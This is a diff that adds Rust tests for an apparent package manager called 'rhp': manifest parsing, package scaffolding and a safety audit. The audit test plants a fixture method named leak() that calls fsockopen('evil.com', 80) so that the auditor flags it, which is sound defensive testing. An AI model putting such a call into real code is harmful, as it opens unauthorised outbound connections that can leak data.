@@ -353,3 +353,184 @@ class Calculator {
 
     let _ = fs::remove_dir_all(&base_temp);
 }
+
+#[test]
+fn test_package_manifest_with_native_and_safety_capabilities() {
+    use rhp::pkg::{PackageSafety, PackageType};
+
+    let toml_str = r#"
+[package]
+name = "rhp/mongo"
+version = "2.0.0"
+type = "native-rust"
+safety = "unsafe"
+rhp-version = ">=0.8.0"
+
+[capabilities]
+network = ["*"]
+
+[native]
+crate-name = "rhp_mongo"
+target-dir = "."
+abi-version = 1
+entry-symbol = "rhp_plugin_init"
+thread-safe = true
+execution-target = "native"
+marshalling = "typed-c-abi"
+facade = "Mongo"
+
+[exports]
+facades = ["Mongo"]
+namespaces = ["Rhp\\Mongo"]
+"#;
+
+    let manifest: Manifest = toml::from_str(toml_str).unwrap();
+    assert_eq!(manifest.package.name, "rhp/mongo");
+    assert_eq!(manifest.package.package_type(), PackageType::NativeRust);
+    assert!(!manifest.package.is_safe());
+    assert_eq!(manifest.package.safety, Some(PackageSafety::Unsafe));
+
+    let caps = manifest.capabilities.unwrap();
+    assert_eq!(caps.network, vec!["*".to_string()]);
+
+    let native = manifest.native.unwrap();
+    assert_eq!(native.crate_name.as_deref(), Some("rhp_mongo"));
+    assert_eq!(native.execution_target.as_deref(), Some("native"));
+    assert_eq!(native.marshalling.as_deref(), Some("typed-c-abi"));
+    assert_eq!(native.facade.as_deref(), Some("Mongo"));
+
+    let exports = manifest.exports.unwrap();
+    assert_eq!(exports.facades, vec!["Mongo".to_string()]);
+}
+
+#[test]
+fn test_scaffold_pure_rhp_package() {
+    use rhp::pkg::{scaffold_package, PackageSafety, PackageType, ScaffoldOptions};
+
+    let temp_dir = std::env::temp_dir().join(format!("rhp_scaffold_pure_{}", std::time::SystemTime::now().elapsed().unwrap().as_nanos()));
+    let opts = ScaffoldOptions {
+        name: "acme/math-toolkit".to_string(),
+        package_type: PackageType::Rhp,
+        safety: PackageSafety::Safe,
+        description: Some("Pure RHP math toolkit".to_string()),
+    };
+
+    scaffold_package(&temp_dir, &opts).unwrap();
+
+    assert!(temp_dir.join("rhp.toml").exists());
+    assert!(temp_dir.join("src/MathToolkit.rhp").exists());
+    assert!(temp_dir.join("tests/MathToolkitTest.rhp").exists());
+
+    let manifest = Manifest::load_from_file(&temp_dir.join("rhp.toml")).unwrap();
+    assert_eq!(manifest.package.package_type(), PackageType::Rhp);
+    assert!(manifest.package.is_safe());
+
+    let _ = fs::remove_dir_all(&temp_dir);
+}
+
+#[test]
+fn test_scaffold_native_rust_package_and_gen_types() {
+    use rhp::pkg::{generate_type_declarations, scaffold_package, PackageSafety, PackageType, ScaffoldOptions};
+
+    let temp_dir = std::env::temp_dir().join(format!("rhp_scaffold_native_{}", std::time::SystemTime::now().elapsed().unwrap().as_nanos()));
+    let opts = ScaffoldOptions {
+        name: "rhp/cassandra-driver".to_string(),
+        package_type: PackageType::NativeRust,
+        safety: PackageSafety::Unsafe,
+        description: Some("Native Cassandra driver".to_string()),
+    };
+
+    scaffold_package(&temp_dir, &opts).unwrap();
+
+    assert!(temp_dir.join("rhp.toml").exists());
+    assert!(temp_dir.join("Cargo.toml").exists());
+    assert!(temp_dir.join("src/lib.rs").exists());
+    assert!(temp_dir.join("cassandra_driver.d.rhp").exists());
+
+    let manifest = Manifest::load_from_file(&temp_dir.join("rhp.toml")).unwrap();
+    assert_eq!(manifest.package.package_type(), PackageType::NativeRust);
+    assert!(!manifest.package.is_safe());
+    assert_eq!(manifest.native.unwrap().marshalling.as_deref(), Some("typed-c-abi"));
+
+    // Verify lib.rs contains connection pool & C-ABI dispatch
+    let lib_code = fs::read_to_string(temp_dir.join("src/lib.rs")).unwrap();
+    assert!(lib_code.contains("pub extern \"C\" fn rhp_call"));
+    assert!(lib_code.contains("CassandraDriverClient"));
+
+    // Re-generate type declarations and verify output
+    let generated = generate_type_declarations(&temp_dir).unwrap();
+    assert!(generated.exists());
+    let types_content = fs::read_to_string(&generated).unwrap();
+    assert!(types_content.contains("final class CassandraDriver"));
+    assert!(types_content.contains("public static function connect"));
+
+    let _ = fs::remove_dir_all(&temp_dir);
+}
+
+#[test]
+fn test_scaffold_wasm_and_hybrid_packages() {
+    use rhp::pkg::{scaffold_package, PackageSafety, PackageType, ScaffoldOptions};
+
+    let base = std::env::temp_dir().join(format!("rhp_scaffold_wasm_hybrid_{}", std::time::SystemTime::now().elapsed().unwrap().as_nanos()));
+    let wasm_dir = base.join("wasm_pkg");
+    let hybrid_dir = base.join("hybrid_pkg");
+
+    // 1. Wasm package
+    scaffold_package(&wasm_dir, &ScaffoldOptions {
+        name: "filter/image-blur".to_string(),
+        package_type: PackageType::Wasm,
+        safety: PackageSafety::Safe,
+        description: Some("Sandboxed image blur".to_string()),
+    }).unwrap();
+
+    let wasm_m = Manifest::load_from_file(&wasm_dir.join("rhp.toml")).unwrap();
+    assert_eq!(wasm_m.package.package_type(), PackageType::Wasm);
+    assert_eq!(wasm_m.native.unwrap().execution_target.as_deref(), Some("wasm"));
+
+    // 2. Hybrid package
+    scaffold_package(&hybrid_dir, &ScaffoldOptions {
+        name: "orm/cosmos-client".to_string(),
+        package_type: PackageType::Hybrid,
+        safety: PackageSafety::Unsafe,
+        description: Some("Hybrid Cosmos DB package".to_string()),
+    }).unwrap();
+
+    let hybrid_m = Manifest::load_from_file(&hybrid_dir.join("rhp.toml")).unwrap();
+    assert_eq!(hybrid_m.package.package_type(), PackageType::Hybrid);
+    assert!(hybrid_dir.join("rhp/CosmosClient.rhp").exists());
+    assert!(hybrid_dir.join("src/lib.rs").exists());
+
+    let _ = fs::remove_dir_all(&base);
+}
+
+#[test]
+fn test_audit_package_violations_and_clean_report() {
+    use rhp::pkg::{audit_package, scaffold_package, PackageSafety, PackageType, ScaffoldOptions};
+
+    let temp_dir = std::env::temp_dir().join(format!("rhp_audit_suite_{}", std::time::SystemTime::now().elapsed().unwrap().as_nanos()));
+    scaffold_package(&temp_dir, &ScaffoldOptions {
+        name: "clean/string-helper".to_string(),
+        package_type: PackageType::Rhp,
+        safety: PackageSafety::Safe,
+        description: Some("Clean string helper".to_string()),
+    }).unwrap();
+
+    // 1. Initial clean package passes audit
+    let initial_report = audit_package(&temp_dir).unwrap();
+    assert!(initial_report.is_clean());
+    assert_eq!(initial_report.violations.len(), 0);
+
+    // 2. Add an illegal fsockopen call inside safe package
+    fs::write(
+        temp_dir.join("src/NetworkProbe.rhp"),
+        "<?php\nclass NetworkProbe { public function leak() { fsockopen('evil.com', 80); } }\n",
+    ).unwrap();
+
+    let dirty_report = audit_package(&temp_dir).unwrap();
+    assert!(!dirty_report.is_clean());
+    assert_eq!(dirty_report.violations.len(), 1);
+    assert_eq!(dirty_report.violations[0].pattern, "fsockopen");
+
+    let _ = fs::remove_dir_all(&temp_dir);
+}
+
